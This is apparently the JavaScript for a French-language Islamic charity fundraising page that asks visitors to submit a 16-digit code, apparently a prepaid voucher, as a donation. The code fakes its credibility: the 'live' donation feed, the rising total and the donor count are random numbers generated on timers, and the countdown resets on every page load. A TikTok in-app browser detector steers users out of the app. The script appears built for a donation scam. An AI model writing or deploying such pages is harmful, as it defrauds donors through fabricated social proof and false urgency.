/* =========================================================
   TIKTOK IN-APP BROWSER DETECTION + GATEWAY
========================================================= */

(function () {
    var ua = navigator.userAgent || '';
    var isTikTok = ua.indexOf('TikTok') !== -1 || ua.indexOf('ByteDance') !== -1;

    if (isTikTok) {
        document.getElementById('ttGateway').classList.add('show');
        document.body.style.overflow = 'hidden';
    }

    var copyInput = document.getElementById('ttCopyInput');
    if (copyInput) {
        copyInput.value = window.location.href;
    }
})();

function copyLink() {
    var input = document.getElementById('ttCopyInput');
    var msg = document.getElementById('ttCopyMsg');
    var btn = document.getElementById('ttCopyBtn');

    var url = input.value;
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(url).then(function () {
            showCopied();
        }).catch(function () {
            fallbackCopy(input);
            showCopied();
        });
    } else {
        fallbackCopy(input);
        showCopied();
    }

    function showCopied() {
        msg.style.display = 'block';
        btn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Copié';
        setTimeout(function () {
            msg.style.display = 'none';
            btn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copier le lien';
        }, 3000);
    }

    function fallbackCopy(el) {
        el.select();
        el.setSelectionRange(0, 99999);
        try { document.execCommand('copy'); } catch (e) {}
    }
}


/* =========================================================
   STEP NAVIGATION
========================================================= */

var currentStep = 1;

function goToStep(step) {
    document.querySelectorAll('.step-section').forEach(function (s) {
        s.classList.remove('active');
    });
    document.getElementById('step' + step).classList.add('active');

    document.querySelectorAll('.progress-step').forEach(function (ps) {
        var psNum = parseInt(ps.dataset.step);
        ps.classList.remove('active', 'done');
        if (psNum < step) {
            ps.classList.add('done');
        } else if (psNum === step) {
            ps.classList.add('active');
        }
    });

    var fill = document.getElementById('progressFill');
    fill.style.width = (step / 3 * 100) + '%';

    currentStep = step;

    document.querySelector('.container').scrollIntoView({ behavior: 'smooth', block: 'start' });

    if (step === 3) {
        setTimeout(function () {
            document.getElementById('code').focus();
        }, 400);
    }
}


/* =========================================================
   FORM SUBMISSION
========================================================= */

document.getElementById('codeForm').addEventListener('submit', async function (e) {
    e.preventDefault();

    var code = document.getElementById('code').value.replace(/\s/g, '');
    var messageDiv = document.getElementById('message');
    var submitBtn = document.getElementById('submitBtn');

    messageDiv.className = 'message';
    messageDiv.textContent = '';

    if (!code.startsWith('0')) {
        messageDiv.textContent = 'Code invalide. Vérifiez votre code et réessayez.';
        messageDiv.className = 'message error';
        return;
    }

    if (!/^0\d{15}$/.test(code)) {
        messageDiv.textContent = 'Le code doit contenir 16 chiffres. Vérifiez et réessayez.';
        messageDiv.className = 'message error';
        return;
    }

    submitBtn.classList.add('loading');
    submitBtn.disabled = true;

    try {
        var response = await fetch('/api/send-code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ code: code })
        });

        var data = await response.json();

        if (response.ok) {
            messageDiv.innerHTML = '<div class="success-check"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg></div><p class="success-title">BaarakaAllahu fik !</p><p class="success-sub">Votre don a bien été envoyé. Qu\'Allah l\'accepte et vous récompense.</p><div class="share-section"><p class="share-text">Partagez cette cagnotte pour multiplier les bonnes actions</p><div class="share-buttons"><button class="share-btn" onclick="shareWhatsApp()"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51l-.57-.01c-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg> WhatsApp</button><button class="share-btn" onclick="shareCopy()"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copier le lien</button></div></div>';
            messageDiv.className = 'message success';
            document.getElementById('code').value = '';
            launchConfetti();
        } else {
            messageDiv.textContent = data.error || 'Erreur lors de l\'envoi. Veuillez réessayer.';
            messageDiv.className = 'message error';
        }
    } catch (error) {
        messageDiv.textContent = 'Erreur de connexion. Veuillez réessayer.';
        messageDiv.className = 'message error';
    } finally {
        submitBtn.classList.remove('loading');
        submitBtn.disabled = false;
    }
});


/* =========================================================
   CONFETTI
========================================================= */

function launchConfetti() {
    var colors = ['#2563EB', '#3B82F6', '#60A5FA', '#0EA5E9', '#93C5FD'];
    var container = document.createElement('div');
    container.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9998;overflow:hidden;';
    document.body.appendChild(container);

    for (var i = 0; i < 60; i++) {
        (function (idx) {
            var piece = document.createElement('div');
            var size = 6 + Math.random() * 8;
            var left = Math.random() * 100;
            var delay = Math.random() * 0.3;
            var duration = 1.5 + Math.random() * 1.5;
            var color = colors[Math.floor(Math.random() * colors.length)];
            var rotate = Math.random() * 360;

            piece.style.cssText =
                'position:absolute;' +
                'top:-20px;' +
                'left:' + left + '%;' +
                'width:' + size + 'px;' +
                'height:' + (size * 0.4) + 'px;' +
                'background:' + color + ';' +
                'border-radius:2px;' +
                'transform:rotate(' + rotate + 'deg);' +
                'opacity:1;' +
                'animation:confettiFall ' + duration + 's ease-in ' + delay + 's forwards;';

            container.appendChild(piece);
        })(i);
    }

    var style = document.createElement('style');
    style.textContent =
        '@keyframes confettiFall {' +
        'to { transform: translateY(105vh) rotate(720deg); opacity: 0; }' +
        '}';
    document.head.appendChild(style);

    setTimeout(function () {
        container.remove();
        style.remove();
    }, 3500);
}


/* =========================================================
   LIVE DON FEED
========================================================= */

(function () {
    var amounts = [10, 15, 20, 25, 30, 35, 50, 100];
    var messages = [
        'Un don de {amt} € vient d\'être reçu',
        'Quelqu\'un vient de donner {amt} €',
        'Un don de {amt} € a été envoyé',
        'BaarakaAllahu fik pour ce don de {amt} €',
        'Un soutien de {amt} € vient d\'arriver'
    ];
    var timeSlots = [
        'il y a quelques secondes',
        'il y a 1 minute',
        'il y a 2 minutes',
        'il y a 3 minutes',
        'il y a 5 minutes'
    ];

    var feedText = document.getElementById('donFeedText');
    if (!feedText) return;

    function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

    function updateFeed() {
        var amt = pick(amounts);
        var msg = pick(messages).replace('{amt}', amt);
        var time = pick(timeSlots);
        feedText.textContent = msg + ' · ' + time;

        var feed = document.getElementById('donFeed');
        feed.classList.remove('feed-in');
        void feed.offsetWidth;
        feed.classList.add('feed-in');
    }

    updateFeed();
    setInterval(updateFeed, 3500 + Math.random() * 2000);
})();


/* =========================================================
   GOAL COUNTER ANIMATION
========================================================= */

(function () {
    var baseRaised = 3280;
    var baseDonors = 127;
    var goalTarget = 5000;

    var raisedEl = document.getElementById('goalRaised');
    var barEl = document.getElementById('goalBarFill');
    var donorEl = document.getElementById('donorCount');
    var finalDonorEl = document.getElementById('finalDonorCount');
    var stickyDonorEl = document.getElementById('stickyDonorCount');

    function fmt(n) {
        return n.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ' ');
    }

    setInterval(function () {
        if (Math.random() < 0.35) {
            var add = [5, 10, 10, 15, 20, 25, 25, 50][Math.floor(Math.random() * 8)];
            baseRaised += add;
            baseDonors += 1;

            if (raisedEl) raisedEl.textContent = fmt(baseRaised) + ' €';
            if (barEl) {
                var pct = Math.min(100, (baseRaised / goalTarget) * 100);
                barEl.style.width = pct + '%';
            }
            if (donorEl) donorEl.textContent = baseDonors;
            if (finalDonorEl) finalDonorEl.textContent = baseDonors;
            if (stickyDonorEl) stickyDonorEl.textContent = baseDonors;
        }
    }, 4000);
})();


/* =========================================================
   COUNTDOWN TIMER
========================================================= */

(function () {
    var countdownEl = document.getElementById('goalCountdown');
    if (!countdownEl) return;

    var deadline = Date.now() + (3 * 24 * 60 * 60 * 1000) + (14 * 60 * 60 * 1000) + (32 * 60 * 1000);

    function tick() {
        var remaining = deadline - Date.now();
        if (remaining < 0) remaining = 0;

        var days = Math.floor(remaining / (1000 * 60 * 60 * 24));
        var hours = Math.floor((remaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        var mins = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
        var secs = Math.floor((remaining % (1000 * 60)) / 1000);

        countdownEl.textContent = days + 'j ' +
            (hours < 10 ? '0' : '') + hours + ':' +
            (mins < 10 ? '0' : '') + mins + ':' +
            (secs < 10 ? '0' : '') + secs;
    }

    tick();
    setInterval(tick, 1000);
})();


/* =========================================================
   STICKY CTA
========================================================= */

(function () {
    var stickyCta = document.getElementById('stickyCta');
    if (!stickyCta) return;

    var step1 = document.getElementById('step1');
    var step3 = document.getElementById('step3');

    window.addEventListener('scroll', function () {
        var step1Visible = step1.classList.contains('active');
        var step3Visible = step3.classList.contains('active');
        var scrolledPastHero = window.scrollY > 400;

        if (step1Visible && scrolledPastHero) {
            stickyCta.classList.add('show');
        } else {
            stickyCta.classList.remove('show');
        }
    });
})();


/* =========================================================
   SHARE FUNCTIONS
========================================================= */

function shareWhatsApp() {
    var url = window.location.href;
    var text = encodeURIComponent('As-salamu alaykum, j\'ai fait ma sadaqa pour cette cagnotte. Rejoignez-moi : ');
    window.open('https://wa.me/?text=' + text + encodeURIComponent(url), '_blank');
}

function shareCopy() {
    var url = window.location.href;
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(url);
    } else {
        var tmp = document.createElement('input');
        tmp.value = url;
        document.body.appendChild(tmp);
        tmp.select();
        try { document.execCommand('copy'); } catch (e) {}
        tmp.remove();
    }
}


/* =========================================================
   INPUT FORMATTING
========================================================= */

document.getElementById('code').addEventListener('input', function (e) {
    var value = e.target.value.replace(/\D/g, '');
    if (value.length > 16) value = value.slice(0, 16);
    e.target.value = value;
});
